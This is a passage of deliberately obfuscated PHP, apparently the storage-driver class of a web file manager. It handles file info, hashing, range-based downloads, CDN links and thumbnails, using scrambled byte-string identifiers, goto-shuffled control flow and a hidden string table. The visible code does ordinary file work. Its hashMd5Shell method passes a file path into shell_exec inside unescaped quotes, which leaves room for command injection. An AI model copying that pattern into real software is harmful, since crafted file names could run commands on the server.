mkdir($câí§“é…Ç, $Eª¤­„ë® = REPEAT_SKIP) { } public function copyFile($EÑø÷á«Éö, $bù°‚Ò“•˜) { } public function moveFile($DŸï®ÒòçŞ, $CŠÉŸµÃòÊ) { } public function remove($Dİ¦Ÿ›ª™Œ) { if ($this->isFile($Dİ¦Ÿ›ª™Œ)) { return $this->delFile($Dİ¦Ÿ›ª™Œ); } return $this->delFolder($Dİ¦Ÿ›ª™Œ); } public function rename($AÃã·±ìËé, $bí¥õöäÖö) { } public function exist($e­Ö¶¥õƒ) { } public function findByHash($Fˆö‡ˆİÚ = '', $D°¥‘¨Ä±Ø = '') { return !1; } public function isFile($aè—ÊÁ…îã) { } public function isFolder($Dõ§¢·Ş®Å) { } public function size($eÎàºÚ˜) { } public function info($AÈ½İà¥Ì) { } public function infoSimple($eïÊÍê¯‚¯) { return $this->info($eïÊÍê¯‚¯); } public function infoAuth($fêÏÄ»ÇéÚ) { return $this->info($fêÏÄ»ÇéÚ); } public function infoFull($fù›ìïÃ·ö) { return $this->info($fù›ìïÃ·ö); } public function infoWithChildren($aòæ›ÒÓ†¥) { $aİƒˆİç¢è =& $_SERVER[õëù©û]; $Fùñá‰½Ñ¶ = $this->info($aòæ›ÒÓ†¥); if ($Fùñá‰½Ñ¶ && $Fùñá‰½Ñ¶[$aİƒˆİç¢è[29]] == $aİƒˆİç¢è[76]) { $c§àï“ª¼õ = array($aİƒˆİç¢è[77] => 0, $aİƒˆİç¢è[78] => 0, $aİƒˆİç¢è[79] => 0); $this->infoChildren($aòæ›ÒÓ†¥, $c§àï“ª¼õ); $Fùñá‰½Ñ¶[$aİƒˆİç¢è[77]] = $c§àï“ª¼õ[$aİƒˆİç¢è[77]]; $Fùñá‰½Ñ¶[$aİƒˆİç¢è[80]] = array($aİƒˆİç¢è[81] => $c§àï“ª¼õ[$aİƒˆİç¢è[78]], $aİƒˆİç¢è[82] => $c§àï“ª¼õ[$aİƒˆİç¢è[79]]); } return $Fùñá‰½Ñ¶; } public function listPath($eÊ…ŒÎ™¢œ, $BÔ„‘óõªé = false) { } public function has($cŒİÕÒÈ­³, $f·ê…½—œÄ = false, $CÇÒÁß‘ìÔ = false) { } public function canRead($Eº®ËŠµîÊ) { } public function canWrite($E¸ÅÌÓåÓ) { } public function getContent($CáÅÆ«ŠùŠ) { } public function setContent($Då³·ÈØñ¿, $Cš’÷Ñ”×© = '') { } protected function infoChildren($f×ÇöÖËÕª, &$C·ğÚ•å‰•) { $fµÓš£Î¡Å =& $_SERVER[õëù©û]; check_abort(); $bšê³­œ¬Ó = $this->listPath($f×ÇöÖËÕª, !0); $bšê³­œ¬Ó = array_merge($bšê³­œ¬Ó[$fµÓš£Î¡Å[74]], $bšê³­œ¬Ó[$fµÓš£Î¡Å[73]]); foreach ($bšê³­œ¬Ó as $FÇÌÃå˜Ş¹) { if ($FÇÌÃå˜Ş¹[$fµÓš£Î¡Å[29]] == $fµÓš£Î¡Å[76]) { $C·ğÚ•å‰•[$fµÓš£Î¡Å[79]]++; $dğé¶òÈàò = $this->getPathInner($FÇÌÃå˜Ş¹[$fµÓš£Î¡Å[75]]); $this->infoChildren($dğé¶òÈàò, $C·ğÚ•å‰•); } else { $C·ğÚ•å‰•[$fµÓš£Î¡Å[78]]++; $C·ğÚ•å‰•[$fµÓš£Î¡Å[77]] += $FÇÌÃå˜Ş¹[$fµÓš£Î¡Å[77]]; } } } public function fileSubstr($eãª×ª²À, $aŠ²ÂÕÙìŸ, $b¬œ¬˜Êç§) { } public function listAll($EõôÖË©Ø‡) { } public function upload($CŸ¿©˜³‹, $B…ÎÜ»–­Ş, $D®š÷Á½‹ = false, $A¾µÌçøµ‰ = REPEAT_REPLACE) { } public function uploadFileByID($bØø¾ÃÕ…, $c¸„¾Ä¥™, $b¨µâİ¹Ò») { } public function uploadFileByPath($c±ø‹†‘ª«, $Bóø’Úš‰„, $Bœá”ßØœ = array()) { } public function isUploadServer() { $AöÄÄÀ¾íã =& $_SERVER[õëù©û]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $AöÄÄÀ¾íã[83]) { return !0; } return $GLOBALS[$AöÄÄÀ¾íã[6]][$AöÄÄÀ¾íã[84]][$AöÄÄÀ¾íã[85]]; } public function isFileOutServer() { $D“¢âš˜Ü… =& $_SERVER[õëù©û]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $D“¢âš˜Ü…[83]) { return !0; } return $GLOBALS[$D“¢âš˜Ü…[6]][$D“¢âš˜Ü…[84]][$D“¢âš˜Ü…[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($e…—İÔåØ) { $FŠÈˆÉ¿‚Î =& $_SERVER[õëù©û]; if (!$this->isCdnHost()) { return $e…—İÔåØ; } return str_replace(trim(get_url_root($e…—İÔåØ), $FŠÈˆÉ¿‚Î[8]), trim($this->cdnHost, $FŠÈˆÉ¿‚Î[8]), $e…—İÔåØ); } public function uploadLink($Fß¬Ü½Ö—, $E™ÇÂ¹†è = 0) { goto EæƒĞÏøõ; EæƒĞÏøõ: $f®¿­êáºğ =& $_SERVER[õëù©û]; if ($this->isUploadServer()) { return; } $fÈÕ¯ì°‘ = $this->getType(); goto Cª¾¨Äµ–; d¥£ŒÑß¶: $Eøµ¤Ï²¦ç = $E™ÇÂ¹†è <= $dÈ¬í™¬Ó ? $f®¿­êáºğ[87] : $f®¿­êáºğ[88]; $Aš˜ÀŒ˜£· = (!$E™ÇÂ¹†è ? 1 : ceil($E™ÇÂ¹†è / pow(1024, 3))) * 3600 * 4; $fÛò½”ß‰ = $this->{$Eøµ¤Ï²¦ç}($Fß¬Ü½Ö—, $Aš˜ÀŒ˜£·); goto CÏÕøˆ¹‹Š; CÏÕøˆ¹‹Š: if ($fÛò½”ß‰) { $fÛò½”ß‰[$f®¿­êáºğ[89]] = $Fß¬Ü½Ö—; $fÛò½”ß‰[$f®¿­êáºğ[90]] = $fÈÕ¯ì°‘; } return $fÛò½”ß‰; goto E“‡¯à¡Ë; Cª¾¨Äµ–: if (!in_array($fÈÕ¯ì°‘, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $dÈ¬í™¬Ó = 1024 * 1024 * 10; goto d¥£ŒÑß¶; E“‡¯à¡Ë: } public function uploadFormData($dù¶÷¶«×ƒ, $cƒó³â•– = 3600) { } public function multiUploadFormData($fº°†ÑíàÉ, $Aã¨İ¤¢ = 3600) { } public function download($bİÛ‹ë³˜§, $E“Ş¼Œï‹®) { } public function ext($D‡†…µ¥) { $F¿·çÂÒÃ¢ =& $_SERVER[õëù©û]; if (strpos($D‡†…µ¥, $F¿·çÂÒÃ¢[8]) === -1) { $F¨¿Ş‹øİÃ = $D‡†…µ¥; } else { $F¨¿Ş‹øİÃ = $this->pathThis($D‡†…µ¥); } $c±¬¢‰¬Ê‚ = $F¿·çÂÒÃ¢[33]; if (strstr($F¨¿Ş‹øİÃ, $F¿·çÂÒÃ¢[91])) { $c±¬¢‰¬Ê‚ = substr($F¨¿Ş‹øİÃ, strrpos($F¨¿Ş‹øİÃ, $F¿·çÂÒÃ¢[91]) + 1); $c±¬¢‰¬Ê‚ = strtolower($c±¬¢‰¬Ê‚); } if (strlen($c±¬¢‰¬Ê‚) > 3 && preg_match($F¿·çÂÒÃ¢[92], $c±¬¢‰¬Ê‚, $AÙ œ´†¡°)) { $c±¬¢‰¬Ê‚ = $F¿·çÂÒÃ¢[33]; } return $c±¬¢‰¬Ê‚; } public function pathThis($eè™§åÄ“) { $a˜¾˜æä‚× =& $_SERVER[õëù©û]; $eè™§åÄ“ = str_replace($a˜¾˜æä‚×[93], $a˜¾˜æä‚×[8], rtrim($eè™§åÄ“, $a˜¾˜æä‚×[8])); $f¼„–Â¼»ë = strrpos($eè™§åÄ“, $a˜¾˜æä‚×[8]); if ($f¼„–Â¼»ë === !1) { return $eè™§åÄ“; } return substr($eè™§åÄ“, $f¼„–Â¼»ë + 1); } public function pathFather($EÑ«‚†«ïØ) { $BÔÕ©¾ğ =& $_SERVER[õëù©û]; $EÑ«‚†«ïØ = str_replace($BÔÕ©¾ğ[93], $BÔÕ©¾ğ[8], rtrim($EÑ«‚†«ïØ, $BÔÕ©¾ğ[8])); $bÚâ®ªÒ¿Ø = strrpos($EÑ«‚†«ïØ, $BÔÕ©¾ğ[8]); if ($bÚâ®ªÒ¿Ø === !1) { return $BÔÕ©¾ğ[33]; } return substr($EÑ«‚†«ïØ, 0, $bÚâ®ªÒ¿Ø + 1); } public function hashSimple($c¬ÆÕ’å…Æ) { goto b»¬³èÊÅ—; b»¬³èÊÅ—: $aˆùÇïÑ† =& $_SERVER[õëù©û]; if (!$c¬ÆÕ’å…Æ) { return md5($aˆùÇïÑ†[33]); } $EÎ‰º¡„‘ = $this->size($c¬ÆÕ’å…Æ); goto däé®êš„Ò; däé®êš„Ò: $B‚Šõˆ ¹š = 200; $bÛ ÔÜçİ = 50; if ($EÎ‰º¡„‘ <= $B‚Šõˆ ¹š * $bÛ ÔÜçİ) { return $this->hashMd5($c¬ÆÕ’å…Æ) . $EÎ‰º¡„‘; } goto BÉò÷Œæ¢÷; BÉò÷Œæ¢÷: $DÑ˜¨ªôÜÉ = intval($EÎ‰º¡„‘ / $bÛ ÔÜçİ); $BÙØ‡˜È = $aˆùÇïÑ†[33]; for ($e÷ ÁÍ²Ô = 0; $e÷ ÁÍ²Ô < $bÛ ÔÜçİ; $e÷ ÁÍ²Ô++) { $BÙØ‡˜È .= $this->fileSubstr($c¬ÆÕ’å…Æ, $DÑ˜¨ªôÜÉ * $e÷ ÁÍ²Ô, $B‚Šõˆ ¹š); } goto fßÄÉâ­…ª; fßÄÉâ­…ª: $BÙØ‡˜È .= $this->fileSubstr($c¬ÆÕ’å…Æ, $EÎ‰º¡„‘ - $B‚Šõˆ ¹š, $B‚Šõˆ ¹š); return md5($BÙØ‡˜È) . $EÎ‰º¡„‘; goto b‚îƒŞ–õ; b‚îƒŞ–õ: } public static $md5Cache = array(); public function hashMd5($Cè—¡ÀêÖ‡) { $Cè—¡ÀêÖ‡ = $this->iconvSystem($Cè—¡ÀêÖ‡); if (isset(self::$md5Cache[$Cè—¡ÀêÖ‡])) { return self::$md5Cache[$Cè—¡ÀêÖ‡]; } self::$md5Cache[$Cè—¡ÀêÖ‡] = $this->hashMd5Shell($Cè—¡ÀêÖ‡); if (!self::$md5Cache[$Cè—¡ÀêÖ‡]) { self::$md5Cache[$Cè—¡ÀêÖ‡] = @md5_file($Cè—¡ÀêÖ‡); } return self::$md5Cache[$Cè—¡ÀêÖ‡]; } private function hashMd5Shell($BÁôòğã·à) { goto dïà·«Íß¤; dïà·«Íß¤: $EĞÂâÍªºŠ =& $_SERVER[õëù©û]; if (!function_exists($EĞÂâÍªºŠ[94])) { return !1; } $d÷åé÷¦·Õ = array($EĞÂâÍªºŠ[95], $EĞÂâÍªºŠ[96]); goto CÎ æçõÓØ; CÎ æçõÓØ: $Có¸Æà‰À¶ = Cache::get($EĞÂâÍªºŠ[97]); if (!$Có¸Æà‰À¶) { $dŸäÆîÓÅÕ = BASIC_PATH . $EĞÂâÍªºŠ[98]; $Eâµê½­ = md5_file($dŸäÆîÓÅÕ); $Có¸Æà‰À¶ = $EĞÂâÍªºŠ[99]; foreach ($d÷åé÷¦·Õ as $dŠ…áïÀå…) { $EÆ‰·„ƒªî = shell_exec($dŠ…áïÀå… . "\x20\x22{$dŸäÆîÓÅÕ}\42"); if ($EÆ‰·„ƒªî && substr(trim($EÆ‰·„ƒªî), 0, 32) == $Eâµê½­) { $Có¸Æà‰À¶ = $dŠ…áïÀå…; break; } } Cache::set($EĞÂâÍªºŠ[97], $Có¸Æà‰À¶, 3600); } if ($Có¸Æà‰À¶ == $EĞÂâÍªºŠ[99]) { return !1; } goto D¥öœÄÎá; D¥öœÄÎá: $EÆ‰·„ƒªî = shell_exec($Có¸Æà‰À¶ . "\40\42{$BÁôòğã·à}\x22"); return substr($EÆ‰·„ƒªî, 0, 32); goto fÁ¦¢­†°µ; fÁ¦¢­†°µ: } public function link($bî¢©­±Ä) { return $bî¢©­±Ä; } public function fileOut($B¹ÅöèèÚ, $eÊ¹ºİ²·â = false, $E˜…²«„ä = false, $cß£ÇğÙ³ = '') { goto AÛ©±©®›¿; c¸ÛÓèß “: header($Añøâ•¢ó‹[124]); header($Añøâ•¢ó‹[125]); header($Añøâ•¢ó‹[126]); goto FùìÀƒ˜; dƒ¶ë“ªŠç: header($Añøâ•¢ó‹[131] . $A¹´•®íõµ . $Añøâ•¢ó‹[123]); header($Añøâ•¢ó‹[132] . $aùğ††•ÛŒ); header($Añøâ•¢ó‹[133]); goto f¦éÉØ¼²; A¥…œ§Ÿã : $bõ¶‚‘Ã = 0; if ($C´àª¸®¸) { $bõ¶‚‘Ã = intval(1000 * 1000 * ($BàõÆØÓï“ / $C´àª¸®¸)); } while ($BÄÂ÷šœÒÍ <= $Aùİõ©‘²·) { $e†ùŠ¬ŸÄ = timeFloat(); check_abort(); $Eƒ¼‚ö§ô = $Aùİõ©‘²· - $BÄÂ÷šœÒÍ + 1; if ($Eƒ¼‚ö§ô <= $BàõÆØÓï“) { $BàõÆØÓï“ = $Eƒ¼‚ö§ô; } echo $this->fileSubstr($B¹ÅöèèÚ, $BÄÂ÷šœÒÍ, $BàõÆØÓï“); $BÄÂ÷šœÒÍ += $BàõÆØÓï“; if ($BàõÆØÓï“ == $Eƒ¼‚ö§ô) { $BÄÂ÷šœÒÍ = $Aùİõ©‘²· + 1; } if ($bõ¶‚‘Ã) { $B§ƒ¥ÍìÍŒ = intval(1000 * 1000 * (timeFloat() - $e†ùŠ¬ŸÄ)); $BÚÔª¤‡Ê = $bõ¶‚‘Ã - $B§ƒ¥ÍìÍŒ; if ($BÚÔª¤‡Ê > 5) { usleep($BÚÔª¤‡Ê); } } } goto aãèÈÆÃóÖ; Cƒº¨•”šö: header($Añøâ•¢ó‹[120]); header($Añøâ•¢ó‹[121] . $E´¿¿åÛÃ); header($Añøâ•¢ó‹[122] . gmdate($Añøâ•¢ó‹[105], time() + 3600 * 24 * 30) . $Añøâ•¢ó‹[123]); goto c¸ÛÓèß “; Bç…é¼¾Ñ: $F‡×Şª‘»ß = strtolower($_SERVER[$Añøâ•¢ó‹[137]]); if ($DÏïÉˆ®³í && $F‡×Şª‘»ß && $b˜¢Ï’Ã») { if (strstr($F‡×Şª‘»ß, $Añøâ•¢ó‹[138])) { header($Añøâ•¢ó‹[139] . $B¹ÅöèèÚ); } else { if (strstr($F‡×Şª‘»ß, $Añøâ•¢ó‹[140])) { header($Añøâ•¢ó‹[141] . $B¹ÅöèèÚ); } else { if (strstr($F‡×Şª‘»ß, $Añøâ•¢ó‹[142])) { header($Añøâ•¢ó‹[143] . $B¹ÅöèèÚ); } } } if ($C´àª¸®¸) { header($Añøâ•¢ó‹[144] . $C´àª¸®¸); } return; } if (isset($_SERVER[$Añøâ•¢ó‹[145]])) { if (preg_match($Añøâ•¢ó‹[146], $_SERVER[$Añøâ•¢ó‹[145]], $FÅéÀôÖ§)) { $BÄÂ÷šœÒÍ = intval($FÅéÀôÖ§[1]); if (!empty($FÅéÀôÖ§[2])) { $Aùİõ©‘²· = intval($FÅéÀôÖ§[2]); } } header($Añøâ•¢ó‹[147]); header("\x43\x6f\x6e\164\x65\x6e\164\55\x52\x61\156\x67\145\72\40\x62\171\x74\x65\x73\40{$BÄÂ÷šœÒÍ}\55{$Aùİõ©‘²·}\57" . $C¬æè›ƒ¤ù); } else { header($Añøâ•¢ó‹[148]); } goto b‹ê¸œ¥Í; AÛ©±©®›¿: $Añøâ•¢ó‹ =& $_SERVER[õëù©û]; $this->cacheMethod(null, null); if (!$B¹ÅöèèÚ || !$this->exist($B¹ÅöèèÚ)) { show_json(LNG($Añøâ•¢ó‹[100]), !1, $E˜…²«„ä); } goto eÎçóø‡øà; FùìÀƒ˜: if (isset($_SERVER[$Añøâ•¢ó‹[127]]) && strtotime($_SERVER[$Añøâ•¢ó‹[127]]) == $aØŒ‚Àé¤¶[$Añøâ•¢ó‹[106]]) { header($Añøâ•¢ó‹[128], !0, 304); die; } if (isset($_SERVER[$Añøâ•¢ó‹[129]]) && $_SERVER[$Añøâ•¢ó‹[129]] == $cß£ÇğÙ³) { header($Añøâ•¢ó‹[130] . $cß£ÇğÙ³, !0, 304); die; } header($Añøâ•¢ó‹[130] . $cß£ÇğÙ³); goto dƒ¶ë“ªŠç; A¥Ÿï¿¿Ô: $BÄÂ÷šœÒÍ = 0; $Aùİõ©‘²· = $C¬æè›ƒ¤ù - 1; $A§Ü†¥·öà = $this->ext($aùğ††•ÛŒ); goto D’õ½í„Î; càÄĞŞ÷¾²: @ob_end_clean(); set_timeout(); $aØŒ‚Àé¤¶ = $this->infoFull($B¹ÅöèèÚ); goto AçÏ‚Æâ¨˜; eÎçóø‡øà: $DÏïÉˆ®³í = $this->getType() == $Añøâ•¢ó‹[101]; $b˜¢Ï’Ã» = $GLOBALS[$Añøâ•¢ó‹[6]][$Añøâ•¢ó‹[84]][$Añøâ•¢ó‹[102]][$Añøâ•¢ó‹[103]]; $C´àª¸®¸ = (double) $GLOBALS[$Añøâ•¢ó‹[6]][$Añøâ•¢ó‹[84]][$Añøâ•¢ó‹[102]][$Añøâ•¢ó‹[104]] * 1024 * 1024; goto càÄĞŞ÷¾²; b‹ê¸œ¥Í: header($Añøâ•¢ó‹[149] . ($Aùİõ©‘²· - $BÄÂ÷šœÒÍ + 1)); if ($_SERVER[$Añøâ•¢ó‹[150]] == $Añøâ•¢ó‹[151]) { return; } $BàõÆØÓï“ = 1024 * 100; goto A¥…œ§Ÿã ; CÍî‰ß¢ß: $eñ˜ãø—­÷ = rawurlencode($aùğ††•ÛŒ); $eñ˜ãø—­÷ = $Añøâ•¢ó‹[112] . $eñ˜ãø—­÷ . $Añøâ•¢ó‹[116] . $eñ˜ãø—­÷; if ($eÊ¹ºİ²·â) { header($Añøâ•¢ó‹[117]); header($Añøâ•¢ó‹[118] . $eñ˜ãø—­÷); } else { header($Añøâ•¢ó‹[119] . $eñ˜ãø—­÷); } goto Cƒº¨•”šö; AçÏ‚Æâ¨˜: $C¬æè›ƒ¤ù = $aØŒ‚Àé¤¶[$Añøâ•¢ó‹[77]]; $A¹´•®íõµ = gmdate($Añøâ•¢ó‹[105], $aØŒ‚Àé¤¶[$Añøâ•¢ó‹[106]]); $aùğ††•ÛŒ = $E˜…²«„ä ? $E˜…²«„ä : $this->iconvApp($aØŒ‚Àé¤¶[$Añøâ•¢ó‹[28]]); goto A¥Ÿï¿¿Ô; E•™½ó™ƒ½: $E´¿¿åÛÃ = get_file_mime($A§Ü†¥·öà); if (strstr($E´¿¿åÛÃ, $Añøâ•¢ó‹[113])) { $E´¿¿åÛÃ = $E´¿¿åÛÃ . $Añøâ•¢ó‹[114]; } if ($eÊ¹ºİ²·â === !1 && !mime_support($E´¿¿åÛÃ)) { $eÊ¹ºİ²·â = !0; $E´¿¿åÛÃ = $Añøâ•¢ó‹[115]; } goto CÍî‰ß¢ß; f¦éÉØ¼²: header($Añøâ•¢ó‹[134] . $C¬æè›ƒ¤ù); header($Añøâ•¢ó‹[135]); if (!$eÊ¹ºİ²·â && $A§Ü†¥·öà == $Añøâ•¢ó‹[136]) { if ($C¬æè›ƒ¤ù > 1024 * 1024 * 5) { die; } $F¶’öá„µ¢ = $this->getContent($B¹ÅöèèÚ); $F¶’öá„µ¢ = Html::clearSVG($F¶’öá„µ¢); echo $F¶’öá„µ¢; die; } goto Bç…é¼¾Ñ; D’õ½í„Î: if (in_array($A§Ü†¥·öà, array($Añøâ•¢ó‹[107], $Añøâ•¢ó‹[108], $Añøâ•¢ó‹[109], $Añøâ•¢ó‹[110]))) { $A§Ü†¥·öà = $Añøâ•¢ó‹[111]; } if (!$cß£ÇğÙ³) { $cß£ÇğÙ³ = md5($A¹´•®íõµ . $this->hashSimple($B¹ÅöèèÚ)); } $cß£ÇğÙ³ = $Añøâ•¢ó‹[112] . $cß£ÇğÙ³ . $Añøâ•¢ó‹[112]; goto E•™½ó™ƒ½; aãèÈÆÃóÖ: } public function fileOutServer($a­Â‰³ƒŠÊ, $D’…Ó’­‘ = false, $EÌñÄËÊ‹Ş = false, $aè÷÷’»¤ = '') { $this->fileOut($a­Â‰³ƒŠÊ, $D’…Ó’­‘, $EÌñÄËÊ‹Ş, $aè÷÷’»¤); } public function fileOutLink($Cù²éâÖ¨“) { header($_SERVER[õëù©û][152] . $Cù²éâÖ¨“); die; } public function cacheMethod($E¿ÖÕÆ»Âß, $a‚¾„†°ë…) { goto E¡÷”ª±É ; cˆ÷á×ãğŒ: if (is_null($E¿ÖÕÆ»Âß)) { $bÇÏéˆÂŞ¶ = array(); return; } if (is_null($a‚¾„†°ë…)) { unset($bÇÏéˆÂŞ¶[$b›Æòµ”…Ò]); return; } $D±ËÙÜôÕà = isset($bÇÏéˆÂŞ¶[$b›Æòµ”…Ò]) ? $bÇÏéˆÂŞ¶[$b›Æòµ”…Ò] : null; goto D×ºïøÑíŒ; D×ºïøÑíŒ: if (!is_null($D±ËÙÜôÕà)) { return $D±ËÙÜôÕà; } $D±ËÙÜôÕà = $this->{$E¿ÖÕÆ»Âß}($a‚¾„†°ë…); $bÇÏéˆÂŞ¶[$b›Æòµ”…Ò] = $D±ËÙÜôÕà; goto d‹Œ¤‰ãÛ; d‹Œ¤‰ãÛ: return $D±ËÙÜôÕà; goto cÏ‘¤áé¾‚; E¡÷”ª±É : $EŠÓ‡ãó¯Í =& $_SERVER[õëù©û]; static $bÇÏéˆÂŞ¶ = array(); $b›Æòµ”…Ò = $EŠÓ‡ãó¯Í[153] . $E¿ÖÕÆ»Âß . $EŠÓ‡ãó¯Í[154] . rtrim($a‚¾„†°ë…, $EŠÓ‡ãó¯Í[8]); goto cˆ÷á×ãğŒ; cÏ‘¤áé¾‚: } public function fileOutImage($aøä•‘™Ä, $eªƒº„±Ä = 250) { goto F‡ï«Ëİé; aŞéŞÛƒ½Ø: if ($Aë“Æ´ƒ©È[$b¼î³±Ä¿[77]] <= 1024 * 50 || !function_exists($b¼î³±Ä¿[155]) || $Aë“Æ´ƒ©È[$b¼î³±Ä¿[156]] == $b¼î³±Ä¿[157]) { return $this->fileOut($aøä•‘™Ä); } if (isset($Aë“Æ´ƒ©È[$b¼î³±Ä¿[158]][$b¼î³±Ä¿[159]])) { $d…©ä•Şåç = $Aë“Æ´ƒ©È[$b¼î³±Ä¿[158]][$b¼î³±Ä¿[159]]; } else { if (isset($Aë“Æ´ƒ©È[$b¼î³±Ä¿[158]][$b¼î³±Ä¿[160]])) { $d…©ä•Şåç = $Aë“Æ´ƒ©È[$b¼î³±Ä¿[158]][$b¼î³±Ä¿[160]]; } else { $d…©ä•Şåç = md5("{$Aë“Æ´ƒ©È[$b¼î³±Ä¿[28]]}\137{$Aë“Æ´ƒ©È[$b¼î³±Ä¿[75]]}\x5f{$Aë“Æ´ƒ©È[$b¼î³±Ä¿[77]]}"); } } $b•Ÿ‘ÀÁÈ¹ = "{$d…©ä•Şåç}\137{$eªƒº„±Ä}\x2e\x70\x6e\x67"; goto D„¬Œ°ã‡Ç; EÔƒçˆîÈÆ: $F‰ñ¬ä—•Æ = DATA_THUMB . $b•Ÿ‘ÀÁÈ¹; if (!@file_exists($F‰ñ¬ä—•Æ)) { $BÓÇë–½ŞĞ = TEMP_FILES; if (!is_dir($BÓÇë–½ŞĞ)) { mk_dir($BÓÇë–½ŞĞ); } $D°¬ÑöğŸ„ = $BÓÇë–½ŞĞ . $d…©ä•Şåç . $b¼î³±Ä¿[91] . $Aë“Æ´ƒ©È[$b¼î³±Ä¿[156]]; if (!@file_exists($D°¬ÑöğŸ„)) { $D°¬ÑöğŸ„ = $this->download($aøä•‘™Ä, $D°¬ÑöğŸ„); } $Aøêó½‹´Ğ = new ImageThumb($D°¬ÑöğŸ„, $b¼î³±Ä¿[163]); $Aøêó½‹´Ğ->prorate($F‰ñ¬ä—•Æ, $eªƒº„±Ä, $eªƒº„±Ä * 10); } if (!file_exists($F‰ñ¬ä—•Æ) || filesize($F‰ñ¬ä—•Æ) < 100) { return @file_exists($D°¬ÑöğŸ„) ? IO::fileOut($D°¬ÑöğŸ„) : $this->fileOut($aøä•‘™Ä); } goto cååÃ³Ìµ; F‡ï«Ëİé: $b¼î³±Ä¿ =& $_SERVER[õëù©û]; if (substr($aøä•‘™Ä, 0, 4) == $b¼î³±Ä¿[142]) { $this->fileOutLink($aøä•‘™Ä); } $Aë“Æ´ƒ©È = $this->info($aøä•‘™Ä); goto aŞéŞÛƒ½Ø; cååÃ³Ìµ: if (!($eˆëõš®ÒÅ = IO::move($F‰ñ¬ä—•Æ, $dÂæëÚğ³))) { return IO::fileOut($F‰ñ¬ä—•Æ); } del_file($F‰ñ¬ä—•Æ); IO::fileOut($eˆëõš®ÒÅ); goto F­Ï“Š»ÆÂ; D„¬Œ°ã‡Ç: if (!($CŒß¹à‹‘ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $b¼î³±Ä¿[161]))) { $dÂæëÚğ³ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $b¼î³±Ä¿[162]); } else { $dÂæëÚğ³ = KodIO::make($CŒß¹à‹‘); } if ($CŒß¹à‹‘ = IO::fileNameExist($dÂæëÚğ³, $b•Ÿ‘ÀÁÈ¹)) { $F‰ñ¬ä—•Æ = KodIO::make($CŒß¹à‹‘); return IO::fileOut($F‰ñ¬ä—•Æ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto EÔƒçˆîÈÆ; F­Ï“Š»ÆÂ: } public function fileOutImageServer($C¤¾ªøö§, $cÎ‡Å‘Å¾¤ = 250) { $this->fileOutImage($C¤¾ªøö§, $cÎ‡Å‘Å¾¤); } public function fileNameAuto($BªÑÜ¿§‰Å, $C·òê²åİö, $d—¦˜§—ÙŒ = REPEAT_RENAME, $Bƒ›¬ï…ªø = false) { goto f‘°‰˜§˜; e·ï°ŸÎŸ: while ($this->exist(rtrim($BªÑÜ¿§‰Å, $cÅŠêè‰¦ğ[8]) . $cÅŠêè‰¦ğ[8] . $fâ§æ¤ŞİÁ)) { $fâ§æ¤ŞİÁ = $f»£ùµÄÉ . "\x28{$f²Ê±ç²š÷}\x29{$d¹İåÄù¿¡}"; $f²Ê±ç²š÷++; } return $fâ§æ¤ŞİÁ; goto D“›ã®Ñ”·; c¡Ö×ñ‹óã: $f²Ê±ç²š÷ = 1; $f»£ùµÄÉ = substr($C·òê²åİö, 0, strlen($C·òê²åİö) - strlen($d¹İåÄù¿¡)); $fâ§æ¤ŞİÁ = $f»£ùµÄÉ . "\50{$f²Ê±ç²š÷}\51{$d¹İåÄù¿¡}"; goto e·ï°ŸÎŸ; f‘°‰˜§˜: $cÅŠêè‰¦ğ =& $_SERVER[õëù©û]; $bì”Šñ§² = $BªÑÜ¿§‰Å === $cÅŠêè‰¦ğ[33] ? $C·òê²åİö : rtrim($BªÑÜ¿§‰Å, $cÅŠêè‰¦ğ[8]) . $cÅŠêè‰¦ğ[8] . $C·òê²åİö; if ($d—¦˜§—ÙŒ == REPEAT_REPLACE || !$this->exist($bì”Šñ§²) || $Bƒ›¬ï…ªø && $d—¦˜§—ÙŒ != REPEAT_RENAME_FOLDER) { return $C·òê²åİö; } goto e²³ÓÜÔÆ; e²³ÓÜÔÆ: if ($d—¦˜§—ÙŒ == REPEAT_SKIP) { return !1; } $d¹İåÄù¿¡ = $cÅŠêè‰¦ğ[91] . get_path_ext($C·òê²åİö); $d¹İåÄù¿¡ = $d¹İåÄù¿¡ == $cÅŠêè‰¦ğ[91] || $Bƒ›¬ï…ªø ? $cÅŠêè‰¦ğ[33] : $d¹İåÄù¿¡; goto c¡Ö×ñ‹óã; D“›ã®Ñ”·: } public function listAllFiles($EÑ†õÌªË±, $E×ÓŒİ¸óæ, $C ½ª„„²ƒ = array()) { goto bª…™™Ä¹Ÿ; bª…™™Ä¹Ÿ: $a‹‘•î¦„ =& $_SERVER[õëù©û]; if (empty($E×ÓŒİ¸óæ)) { return array(); } $D‡•Á±†¬ = array(); goto a¾ÕÍ“ñá; cé¹Ï¹­Ã: foreach (array_unique($D‡•Á±†¬) as $eÈ©ö©‘) { $fñßöŒ´¨å = array($a‹‘•î¦„[75] => $this->getPathOuter($a‹‘•î¦„[8] . $EÑ†õÌªË± . $a‹‘•î¦„[8] . $eÈ©ö©‘), $a‹‘•î¦„[76] => 1, $a‹‘•î¦„[77] => 0); if (substr($eÈ©ö©‘, -1) != $a‹‘•î¦„[8]) { $fñßöŒ´¨å[$a‹‘•î¦„[76]] = 0; $aÌö®¶ê“â = $this->getPath($EÑ†õÌªË± . $a‹‘•î¦„[8] . $eÈ©ö©‘); $fñßöŒ´¨å[$a‹‘•î¦„[77]] = isset($C ½ª„„²ƒ[$aÌö®¶ê“â]) ? $C ½ª„„²ƒ[$aÌö®¶ê“â] : $this->size($aÌö®¶ê“â); } $F»Ş‡ÃÖ ’[] = $fñßöŒ´¨å; } return $F»Ş‡ÃÖ ’; goto c©¨òÑÅã‹; a¾ÕÍ“ñá: $EÑ†õÌªË± = trim($EÑ†õÌªË±, $a‹‘•î¦„[8]); foreach ($E×ÓŒİ¸óæ as $eÈ©ö©‘) { $B‡‡å Î = ltrim(substr($eÈ©ö©‘, strlen($EÑ†õÌªË±)), $a‹‘•î¦„[8]); $D‡•Á±†¬ = array_merge($D‡•Á±†¬, $this->slicePath($B‡‡å Î)); } $F»Ş‡ÃÖ ’ = array(); goto cé¹Ï¹­Ã; c©¨òÑÅã‹: } public function slicePath($bèµÛ×¡Ñ) { $a›´¾‡¬š =& 